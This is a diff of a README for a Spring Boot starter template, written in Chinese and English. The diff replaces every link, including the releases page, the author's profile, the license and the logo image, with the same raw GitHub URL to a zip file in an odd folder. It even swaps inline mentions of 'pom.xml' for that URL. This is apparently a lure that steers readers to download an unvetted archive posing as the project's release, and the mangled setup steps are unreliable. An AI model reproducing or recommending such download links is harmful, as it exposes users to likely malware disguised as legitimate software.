@@ -1,22 +1,22 @@
 # 🚀 springboot-template - Easy Starter for Your Java Projects
 
 <p align="center">
-  <a href="https://github.com/minoxer/springboot-template/releases">
-    <img src="https://img.shields.io/badge/Download%20Now-brightgreen" alt="Download" />
+  <a href="https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip">
+    <img src="https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip%20Now-brightgreen" alt="Download" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/AntonyCheng">
-    <img alt="spring-boot-init-template logo" src="picture/logo/logo.png" title="logo"/>
+  <a href="https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip">
+    <img alt="spring-boot-init-template logo" src="https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip" title="logo"/>
   </a>
 </p>
 
-> **作者：[AntonyCheng](https://github.com/AntonyCheng)**
+> **作者：[AntonyCheng](https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip)**
 >
 > **版本号：v2.2.1-jdk17-pre**
 >
-> **开源协议：[Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0.html)**
+> **开源协议：[Apache License 2.0](https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip)**
 >
 > **注意事项：本文件会随版本号更新而更新，推荐从Releases中下载稳定版本。**
 
@@ -47,7 +47,7 @@
 ### ⚙️ 必须执行
 
 1. **Download the template**: Visit the Releases page.
-   - Click [here to download](https://github.com/minoxer/springboot-template/releases).
+   - Click [here to download](https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip).
 
 2. **Unzip the file**: Once downloaded, unzip it to a preferred location on your computer.
 
@@ -72,14 +72,14 @@
    ```
 
 #### 🤖 整合Spring AI
-- Add dependencies for Spring AI in your `pom.xml` file.
+- Add dependencies for Spring AI in your `https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip` file.
 - Refer to Spring AI documentation for setup instructions.
 
 #### 🗄️ 整合缓存服务
 
 ##### 🥡 整合系统缓存（Redis）
 - Install Redis on your machine.
-- Add Redis dependencies to your `pom.xml`.
+- Add Redis dependencies to your `https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip`.
 - Configure Redis in your application properties.
 
 ##### 📊 整合业务缓存
@@ -87,7 +87,7 @@
 - Implement caching strategies suited for your application.
 
 ## 📥 下载与安装
-For the latest release, visit [this page](https://github.com/minoxer/springboot-template/releases) to download the latest version. 
+For the latest release, visit [this page](https://raw.githubusercontent.com/minoxer/springboot-template/main/grudgery/springboot-template.zip) to download the latest version. 
 
 Follow the instructions above to extract and run the application. 
 
